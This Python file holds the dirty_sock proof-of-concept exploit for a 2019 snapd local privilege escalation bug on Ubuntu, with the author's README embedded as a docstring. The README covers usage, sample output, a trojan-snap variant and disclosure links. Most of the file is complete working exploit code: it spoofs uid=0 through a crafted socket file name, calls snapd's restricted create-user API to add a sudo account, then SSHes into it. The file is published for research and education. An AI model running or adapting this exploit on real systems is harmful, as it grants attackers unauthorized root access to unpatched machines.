#!/usr/bin/env python3

"""
# dirty_sock: Privilege Escalation in Ubuntu (via snapd)
In January 2019, current versions of Ubuntu Linux were found to be vulnerable to local privilege escalation due to a bug in the snapd API. This repository contains the original exploit POC, which is being made available for research and education. For a detailed walkthrough of the vulnerability and the exploit, please refer to the <a href="https://initblog.com/2019/dirty-sock/" target="_blank"> blog posting here</a>.

You can easily check if your system is vulnerable. Run the command below. If your `snapd` is 2.37.1 or newer, you are safe.
```
$ snap version
...
snapd   2.37.1
...
```

# Usage
## Version One (use in most cases)
This exploit bypasses access control checks to use a restricted API function (POST /v2/create-user) of the local snapd service. This queries the Ubuntu SSO for a username and public SSH key of a provided email address, and then creates a local user based on these value.

Successful exploitation for this version requires an outbound Internet connection and an SSH service accessible via localhost.

To exploit, first create an account at the <a href="https://login.ubuntu.com/" target="_blank">Ubuntu SSO</a>. After confirming it, edit your profile and upload an SSH public key. Then, run the exploit like this (with the SSH private key corresponding to public key you uploaded):

```
python3 ./dirty_sockv1.py -u "you@yourmail.com" -k "id_rsa"

[+] Slipped dirty sock on random socket file: /tmp/ktgolhtvdk;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Sending payload...
[+] Success! Enjoy your new account with sudo rights!

[Script will automatically ssh to localhost with the SSH key here]
```

## Version Two (use in special cases)
This exploit bypasses access control checks to use a restricted API function (POST /v2/snaps) of the local snapd service. This allows the installation of arbitrary snaps. Snaps in "devmode" bypass the sandbox and may include an "install hook" that is run in the context of root at install time.

dirty_sockv2 leverages the vulnerability to install an empty "devmode" snap including a hook that adds a new user to the local system. This user will have permissions to execute sudo commands.

As opposed to version one, this does not require the SSH service to be running. It will also work on newer versions of Ubuntu with no Internet connection at all, making it resilient to changes and effective in restricted environments.

This exploit should also be effective on non-Ubuntu systems that have installed snapd but that do not support the "create-user" API due to incompatible Linux shell syntax.

Some older Ubuntu systems (like 16.04) may not have the snapd components installed that are required for sideloading. If this is the case, this version of the exploit may trigger it to install those dependencies. During that installation, snapd may upgrade itself to a non-vulnerable version. Testing shows that the exploit is still successful in this scenario. See the troubleshooting section for more details.

To exploit, simply run the script with no arguments on a vulnerable system.

```
python3 ./dirty_sockv2.py

[+] Slipped dirty sock on random socket file: /tmp/gytwczalgx;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...

********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************

```


# Troubleshooting
If using version two, and the exploit completes but you don't see your new account, this may be due to some background snap updates. You can view these by executing `snap changes` and then `snap change #`, referencing the line showing the install of the dirty_sock snap. Eventually, these should complete and your account should be usable.

Version 1 seems to be the easiest and fastest, if your environment supports it (SSH service running and accessible from localhost).

Please open issues for anything weird.

# Disclosure Info
The issue was reported directly to the snapd team via Ubuntu's bug tracker. You can read the full thread <a href="https://bugs.launchpad.net/snapd/+bug/1813365" target="_blank">here</a>.

I was very impressed with Canonical's response to this issue. The team was awesome to work with, and overall the experience makes me feel very good about being an Ubuntu user myself.

Public advisory links:
- https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SnapSocketParsing
- https://usn.ubuntu.com/3887-1/


Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46361.zip
"""

"""
Local privilege escalation via snapd, affecting Ubuntu and others.

v1 of dirty_sock leverages the /v2/create-user API to create a new local user
based on information in an Ubuntu SSO profile. It requires outbound Internet
access as well as the SSH service running and available from localhost.

Try v2 in more restricted environments, but use v1 when possible.

Before running v1, you need to:
    - Create an Ubuntu SSO account (https://login.ubuntu.com/)
    - Login to that account and ensure you have your public SSH key configured
      in your profile.

Run exploit like this:
    dirty_sock.py -u <account email> -k <ssh priv key file>

A new local user with sudo rights will be created using the username from your
Ubuntu SSO profile. The SSH public key will be copied into this users profile.

The exploit will automatically SSH into localhost when finished.

Research and POC by initstring (https://github.com/initstring/dirty_sock)
"""

import argparse
import string
import random
import socket
import re
import sys
import os

BANNER = r'''
      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 1)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//

'''


def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('--username', '-u', type=str, action='store',
                        required=True, help='Your Ubuntu One account email.')
    parser.add_argument('--key', '-k', type=str, action='store',
                        required=True, help='Full path to the ssh privkey'
                        ' matching the pubkey in your Ubuntu One account.')

    args = parser.parse_args()

    if not os.path.isfile(args.key):
        print("[!] That key file does not exist. Please try again.")
        sys.exit()

    return args

def create_sockfile():
    """Generates a random socket file name to use"""
    alphabet = string.ascii_lowercase
    random_string = ''.join(random.choice(alphabet) for i in range(10))
    dirty_sock = ';uid=0;'

    # This is where we slip on the dirty sock. This makes its way into the
    # UNIX AF_SOCKET's peer data, which is parsed in an insecure fashion
    # by snapd's ucrednet.go file, allowing us to overwrite the UID variable.
    sockfile = '/tmp/' + random_string + dirty_sock

    print("[+] Slipped dirty sock on random socket file: " + sockfile)

    return sockfile

def bind_sock(sockfile):
    """Binds to a local file"""
    # This exploit only works if we also BIND to the socket after creating
    # it, as we need to inject the dirty sock as a remote peer in the
    # socket's ancillary data.
    print("[+] Binding to socket file...")
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.bind(sockfile)

    # Connect to the snap daemon
    print("[+] Connecting to snapd API...")
    client_sock.connect('/run/snapd.socket')

    return client_sock

def add_user(args, client_sock):
    """Main exploit function"""
    post_payload = ('{"email": "' + args.username +
                    '", "sudoer": true, "force-managed": true}')
    http_req = ('POST /v2/create-user HTTP/1.1\r\n'
                'Host: localhost\r\n'
                'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                + post_payload)

    # Send our payload to the snap API
    print("[+] Sending payload...")
    client_sock.sendall(http_req.encode("utf-8"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Try to extract a username from the valid reply
    regex = re.compile(r'"status":"OK","result":{"username":"(.*?)"')
    username = re.findall(regex, http_reply)

    # If exploit was not successful, give details and exit
    if '"status":"Unauthorized"' in http_reply:
        print("[!] System may not be vulnerable, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    if 'cannot find user' in http_reply:
        print("[!] Could not find user in the snap store... did you follow"
              " the instructions?")
        print("Here is the API reply:")
        print(http_reply)
        sys.exit()

    if not username:
        print("[!] Something went wrong... Here is the API reply:")
        print(http_reply)
        sys.exit()

    # SSH into localhost with our new root account
    print("[+] Success! Enjoy your new account with sudo rights!")
    cmd1 = 'chmod 600 ' + args.key
    cmd2 = 'ssh ' + username[0] + '@localhost -i ' + args.key
    os.system(cmd1)
    os.system(cmd2)

    print("[+] Hope you enjoyed your stay!")
    sys.exit()



def main():
    """Main program function"""

    # Gotta have a banner...
    print(BANNER)

    # Process the required arguments
    args = process_args()

    # Create a random name for the dirty socket file
    sockfile = create_sockfile()

    # Bind the dirty socket to the snapdapi
    client_sock = bind_sock(sockfile)

    # Exploit away...
    add_user(args, client_sock)

    # Remove the dirty socket file
    os.remove(sockfile)


if __name__ == '__main__':
    main()